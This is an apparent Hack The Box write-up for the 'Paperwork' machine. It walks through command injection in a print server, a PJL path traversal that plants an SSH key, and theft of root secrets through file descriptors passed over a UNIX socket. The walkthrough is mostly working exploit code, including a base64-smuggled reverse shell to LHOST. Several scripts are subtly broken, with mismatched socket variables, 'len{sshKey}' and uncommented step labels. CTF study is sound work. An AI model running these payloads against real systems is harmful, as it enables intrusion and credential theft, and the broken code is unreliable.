# [PaperWork on HTB](https://hackthebox.com/machines/Paperwork)

## Initial Foothold

After downloading the archive file, we unzip it to read the contents of server.py

vulnerable code
```bash
    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
    ................

     print(f"{self.id} Executing archive for: {job_name}")
            
      ----> # vulnerable code line, takes in user jobs and passes it to shell <----
      ----> # as a result leading to RCE Digital-Archiving-Solutions-v1.02-RCE <-----
      ----> # Added the above 2 comments                                       <----
            subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

With this knowledge, we can use the public POC for this vuln or craft a simple one.

```python
import socket
import base64

target = "RHOST"
port = RPORT
queue = "archive_intake"

shell = "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
b64EnShell = base64.b64encode(shell.encode()).decode()
cmd = f"J'; echo {b64EnShell} | base64 -d | bash #"

def b1t3(arg):
    return bytes([arg])


sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sckt.connect((target, port))
sckt.sendall(b1t3(2) + queue.encode() + b"\n")
res = sckt.recv(1024)

print(res)

s.sendall(b1t3(2) + f"{len(cmd)}".encode())
s.recv(1024)


s.sendall(cmd.encode())
s.close()
```
Supply the necessary parameters and run the script with a listener waiting.

Once the shell is gained, we should be logged in as the lp user (Line printer).

Further enumeration confirms that our lp user is of the lowest privileges, proceeding with lateral movement
<br>
<br>

## Lateral movement
We discover a user 'archivist' by running ls against the home directory and a process running as this user with ps aux
```
python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```
Seeing as the supposed printer is a jet direct, exploitation required use of the @PJL (print job language) syntax.

Crafting a @PJL request that;
1) Reads out of the 'printer' folder and writes to .ssh of archivist
2) Uploads our ssh pub key (in the printer perspective, download our ssh keys)
3) Giving us access to archivist user

```
import socket

sshKey = b"PUB SSH KEY HERE"
job = b"@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=%d\r\n" % len{sshKey} + sshKey

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))

s.send(b"\x1b%-12345" + job + b"\x1b%-12345X\r\n")

try: s.recv(400)
except: pass
s.close()
```
<br>
<br>

## Gaining root
Logged in as archivist, we discover a daemon running as root
```
python3 /usr/bin/paperwork-daemon
```
Reading this daemon
1) Takes a UNIX socket object, and runs chmod 660 on a custom socket file
2) It scans for entrance of "FSQUERY", "FSUPLOAD", "FSDOWNLOAD" in 'command.log' of archivist
3) If it finds one, it initiates a lock down
4) Writing the admin (root) secrets to '/etc/paperwork/admin_pins.conf'

```
1) <--
def main():
    socket_path = "/run/paperwork/mgmt.sock"
    if os.path.exists(socket_path): os.remove(socket_path)
    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")

    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660) (1 <--

2) <--
def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False   (2 <---

3) <--
def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")


        with open(LOG_PATH, 'w') as f:
            f.truncate(0)

        os.close(log_fd)
    except:
        pass (3 <--

4) <--
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data (4 <--
```
Since we triggered FSDOWNLOAD earlier, it should write the admin secrets to
```
/etc/paperwork/admin_pins.conf
```
So, we write a script that;
1) connects to the socket channel
2) create an array to hold the File Descriptor and extract its SCM_RIGHTS
3) Reads through the file descriptor of every request captured and returns it to terminal

granting us the admin password
```
import socket, array, os

1) Connect
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/paperwork/mgmt.sock')

2) Create
fds = array.array('i')
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(64))
print(f'MSG: {msg}')

2) Extract
for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])

3) Reads
for fd in fds:
    print(os.pread(fd, 4096, 0))
```

Watch
```
https://youtu.be/1UHaR54i3ak
```
For linux sockets basics


